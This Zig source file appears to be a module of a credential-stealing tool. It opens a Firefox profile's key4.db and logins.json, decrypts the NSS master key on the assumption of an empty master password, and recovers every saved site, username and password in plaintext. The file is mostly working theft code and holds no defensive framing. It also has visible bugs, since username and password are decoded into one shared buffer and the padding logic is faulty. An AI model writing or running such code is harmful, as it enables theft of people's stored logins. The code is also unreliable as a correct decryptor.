const std = @import("std");
const file_io = @import("../parsers/file_io.zig");
const sqLoot = @import("../parsers/sqLoot.zig");
const asn1 = @import("firefox_asn1.zig");

pub const LoginEntry = struct {
    hostname: []const u8,
    username: []const u8,
    password: []const u8,
};

pub fn extractLogins(allocator: std.mem.Allocator, profile_dir: []const u8, out: *std.ArrayList(LoginEntry)) void {
    // Build paths
    var key4_path_buf: [512]u8 = undefined;
    var logins_path_buf: [512]u8 = undefined;

    const key4_path = std.fmt.bufPrint(&key4_path_buf, "{s}\\key4.db", .{profile_dir}) catch return;
    const logins_path = std.fmt.bufPrint(&logins_path_buf, "{s}\\logins.json", .{profile_dir}) catch return;

    // Read key4.db
    const key4_mapped = file_io.MappedFile.open(key4_path) orelse return;
    defer key4_mapped.close();

    var key4_db = sqLoot.SqliteDb.open(allocator, key4_mapped.slice()) catch return;
    defer key4_db.deinit();

    // Extract global salt and password blob from metaData table
    const meta_rows = key4_db.readTable("metaData") catch return;
    defer {
        for (meta_rows) |r| allocator.free(r);
        allocator.free(meta_rows);
    }

    var global_salt: ?[]const u8 = null;
    var password_blob: ?[]const u8 = null;

    for (meta_rows) |row| {
        if (row.len < 2) continue;
        const id_val = row[0];
        const item1_val = row[1];
        if (id_val != .text) continue;
        if (item1_val != .blob) continue;

        if (std.mem.eql(u8, id_val.text, "global-salt")) {
            global_salt = item1_val.blob;
        } else if (std.mem.eql(u8, id_val.text, "password")) {
            password_blob = item1_val.blob;
        }
    }

    const gs = global_salt orelse return;
    const pw = password_blob orelse return;

    // Decrypt password blob using metaPBE (try with empty master password)
    var pbe_out: [1024]u8 = undefined;
    const decrypted_pw = asn1.decryptMetaPbe(gs, pw, &pbe_out) orelse return;

    // Read nssPrivate table for the decryption key
    const priv_rows = key4_db.readTable("nssPrivate") catch return;
    defer {
        for (priv_rows) |r| allocator.free(r);
        allocator.free(priv_rows);
    }

    var a11_key: ?[]const u8 = null;
    var a102_key: ?[]const u8 = null;

    for (priv_rows) |row| {
        if (row.len < 3) continue;
        const a11_val = row[1];
        const a102_val = row[2];
        if (a11_val == .blob) a11_key = a11_val.blob;
        if (a102_val == .blob) a102_key = a102_val.blob;
    }

    const nss_key = a11_key orelse a102_key orelse return;

    // Decrypt nssPrivate key using nssPBE
    var nss_out: [512]u8 = undefined;
    const decrypted_nss = asn1.decryptNssPbe(gs, decrypted_pw, nss_key, &nss_out) orelse return;

    // Read logins.json
    const logins_mapped = file_io.MappedFile.open(logins_path) orelse return;
    defer logins_mapped.close();

    const json_data = logins_mapped.slice();

    // Parse logins.json manually for encrypted entries
    var search_pos: usize = 0;
    while (search_pos < json_data.len) {
        // Find "hostname"
        const host_start = std.mem.indexOfPos(u8, json_data, search_pos, "\"hostname\"") orelse break;
        const host_val_start = std.mem.indexOfPos(u8, json_data, host_start, "\"") orelse break;
        const host_val_quote_start = host_val_start + 1;
        const host_val_end = std.mem.indexOfScalarPos(u8, json_data, host_val_quote_start, '"') orelse break;
        const hostname = json_data[host_val_quote_start..host_val_end];

        // Find "encryptedUsername"
        const user_marker = std.mem.indexOfPos(u8, json_data, host_val_end, "\"encryptedUsername\"") orelse {
            search_pos = host_val_end;
            continue;
        };
        const user_val_start = std.mem.indexOfPos(u8, json_data, user_marker, "\"") orelse break;
        const user_val_quote_start = user_val_start + 1;
        const user_val_end = std.mem.indexOfScalarPos(u8, json_data, user_val_quote_start, '"') orelse break;
        const user_b64 = json_data[user_val_quote_start..user_val_end];

        // Find "encryptedPassword"
        const pass_marker = std.mem.indexOfPos(u8, json_data, user_val_end, "\"encryptedPassword\"") orelse {
            search_pos = user_val_end;
            continue;
        };
        const pass_val_start = std.mem.indexOfPos(u8, json_data, pass_marker, "\"") orelse break;
        const pass_val_quote_start = pass_val_start + 1;
        const pass_val_end = std.mem.indexOfScalarPos(u8, json_data, pass_val_quote_start, '"') orelse break;
        const pass_b64 = json_data[pass_val_quote_start..pass_val_end];

        // Decode base64
        var decode_buf: [4096]u8 = undefined;
        const user_enc = base64Decode(user_b64, &decode_buf) orelse {
            search_pos = pass_val_end;
            continue;
        };
        const pass_enc = base64Decode(pass_b64, &decode_buf) orelse {
            search_pos = pass_val_end;
            continue;
        };

        // Decrypt login entries using loginPBE
        var login_out: [2048]u8 = undefined;

        // Try nssPBE first (ASN1 wrapped), then direct loginPBE
        var username_dec: ?[]const u8 = null;
        var password_dec: ?[]const u8 = null;

        if (user_enc.len > 2 and user_enc[0] == 0x30) {
            username_dec = asn1.decryptNssPbe(gs, decrypted_nss, user_enc, &login_out);
        }
        if (username_dec == null) {
            username_dec = asn1.decryptLoginPbe(gs, user_enc, &login_out);
        }

        var pass_out: [2048]u8 = undefined;
        if (pass_enc.len > 2 and pass_enc[0] == 0x30) {
            password_dec = asn1.decryptNssPbe(gs, decrypted_nss, pass_enc, &pass_out);
        }
        if (password_dec == null) {
            password_dec = asn1.decryptLoginPbe(gs, pass_enc, &pass_out);
        }

        if (username_dec) |u| {
            if (password_dec) |p| {
                const h = allocator.dupe(u8, hostname) catch break;
                const us = allocator.dupe(u8, u) catch break;
                const ps = allocator.dupe(u8, p) catch break;
                out.append(.{ .hostname = h, .username = us, .password = ps }) catch break;
            }
        }

        search_pos = pass_val_end;
    }
}

const BASE64_DECODE: [256]i8 = blk: {
    var table: [256]i8 = .{ -1 } ** 256;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (chars, 0..) |c, i| table[c] = @as(i8, @intCast(i));
    table['='] = 0;
    break :blk table;
};

fn base64Decode(input: []const u8, out: []u8) ?[]u8 {
    if (input.len == 0 or input.len % 4 != 0) return null;
    const max_out = (input.len / 4) * 3;
    if (out.len < max_out) return null;

    var padding: usize = 0;
    if (input.len >= 2 and input[input.len - 2] == '=') padding = 2;
    if (input.len >= 1 and input[input.len - 1] == '=') padding = 1;
    const out_len = max_out - padding;
    var out_pos: usize = 0;
    var i: usize = 0;

    while (i < input.len) : (i += 4) {
        const a = BASE64_DECODE[input[i]];
        const b = BASE64_DECODE[input[i + 1]];
        const c = BASE64_DECODE[input[i + 2]];
        const d = BASE64_DECODE[input[i + 3]];
        if (a < 0 or b < 0) return null;
        if (c < 0 and input[i + 2] != '=') return null;
        if (d < 0 and input[i + 3] != '=') return null;
        out[out_pos] = @as(u8, @intCast((a << 2) | (b >> 4)));
        out_pos += 1;
        if (out_pos >= out_len) break;
        if (c >= 0) { out[out_pos] = @as(u8, @intCast((b << 4) | (c >> 2))); out_pos += 1; }
        if (out_pos >= out_len) break;
        if (d >= 0) { out[out_pos] = @as(u8, @intCast((c << 6) | d)); out_pos += 1; }
    }
    return out[0..out_len];
}

test "base64Decode standard" {
    var buf: [64]u8 = undefined;
    const result = base64Decode("SGVsbG8gV29ybGQ=", &buf) orelse return error.DecodeFailed;
    try std.testing.expectEqualSlices(u8, "Hello World", result);
}

test "base64Decode no padding" {
    var buf: [64]u8 = undefined;
    const result = base64Decode("Zm9vYmFy", &buf) orelse return error.DecodeFailed;
    try std.testing.expectEqualSlices(u8, "foobar", result);
}
